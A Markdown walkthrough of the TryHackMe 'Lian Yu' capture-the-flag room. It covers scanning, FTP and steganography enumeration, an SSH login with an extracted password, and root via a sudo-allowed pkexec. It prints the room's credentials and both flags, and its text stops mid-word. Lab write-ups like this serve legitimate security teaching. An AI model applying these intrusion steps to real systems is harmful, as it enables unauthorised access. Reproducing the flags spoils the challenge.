# 🏝️ Lian Yu – TryHackMe Walkthrough

![Banner](https://i.imgur.com/your-banner-image.png)

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Type](https://img.shields.io/badge/Type-CTF-blue)
![Focus](https://img.shields.io/badge/Focus-Enumeration%20%7C%20Stego%20%7C%20PrivEsc-purple)

---

## 🧠 Overview

Lian Yu is a TryHackMe CTF inspired by *Arrow (Deathstroke / Slade Wilson storyline)*.  
The challenge focuses on enumeration, steganography, hidden web directories, and privilege escalation.

---

## 🎯 Objectives

- Enumerate services and hidden directories  
- Exploit FTP and web exposure  
- Extract hidden data from images  
- Gain SSH access  
- Escalate privileges to root  
- Capture `user.txt` and `root.txt`

---

## 🔎 1. Reconnaissance

### Nmap Scan

nmap -sC -sV -A 10.48.137.137


### Open Ports
- 21/tcp – FTP (vsftpd 3.0.2)  
- 22/tcp – SSH (OpenSSH 6.7p1)  
- 80/tcp – HTTP (Apache – “Purgatory”)  
- 111/tcp – rpcbind  

---

## 🌐 2. Web Enumeration

### Gobuster

gobuster dir -u http://10.48.137.137
 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt


### Findings
- /island  
- /island/2100  
- /server-status  

Hidden file:

/green_arrow.ticket


---

## 📂 3. FTP Enumeration

### Login

ftp 10.48.165.72


User:

vigilante


### Files Found
- Leave_me_alone.png  
- Queen's_Gambit.png  
- aa.jpg  
- .other_user  

Download all:

mget *


---

## 🕵️ 4. Steganography

### Extract hidden file

steghide --extract -sf aa.jpg


Output:

ss.zip


### Unzip

unzip ss.zip


Files:
- passwd.txt  
- shado  

### Hidden credential

cat shado
M3tahuman


---

## 🔑 5. SSH Access


ssh slade@10.48.137.137


Password:

M3tahuman


---

## 👤 6. User Flag


cat user.txt

THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}


---

## ⚙️ 7. Privilege Escalation

### Check sudo rights

sudo -l


Result:

(root) PASSWD: /usr/bin/pkexec


### Exploit

sudo -u root /usr/bin/pkexec /bin/bash


---

## 👑 8. Root Flag


cat root.txt

THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}


---

## 🧾 Summary

### Techniques Used
- Web enumeration (Gobuster)  
- FTP exploitation  
- Steganography (steghide)  
- Hidden file analysis  
- SSH credential discovery  
- Privilege escalation (pkexec abuse)  

---

## 💬 Conclusion

This machine highlights the importance of **deep enumeration and hidden file inspection**. Most acces
